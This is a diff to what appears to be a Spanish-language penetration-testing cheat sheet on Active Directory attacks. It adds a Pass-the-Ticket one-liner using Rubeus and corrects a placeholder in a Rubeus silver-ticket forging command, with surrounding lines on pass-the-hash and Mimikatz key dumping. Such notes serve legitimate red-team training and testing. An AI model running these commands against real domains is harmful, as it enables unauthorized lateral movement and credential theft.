@@ -270,6 +270,10 @@ pth dominio\usuario HASH
 ```
 ## Pass The Ticket
 
+One-liner
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DOMAIN (/domain:DEV) /username:USER /password:CronoXPass /ticket:doIFXD[...]MuaW8=
+```
 Coger el LUID e ID del proceso cmd.exe
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
@@ -633,7 +637,7 @@ mimikatz !sekurlsa::ekeys
 ```
 En la otra maquina, crea un TGS con los datos
 ```
-C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/EQUIPO_LLAVES_KERBEROS.DOMINIO /aes256:LLAVE_KERBEROS /user:USUARIO /domain:DOMINIO /sid:SID_DOMINIO /nowrap
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/EQUIPO_LLAVES_KERBEROS.DOMINIO /aes256:EQUIPO_LLAVE_KERBEROS /user:USUARIO /domain:DOMINIO /sid:SID_DOMINIO /nowrap
 ```
 
 # Forest & Domain Trusts
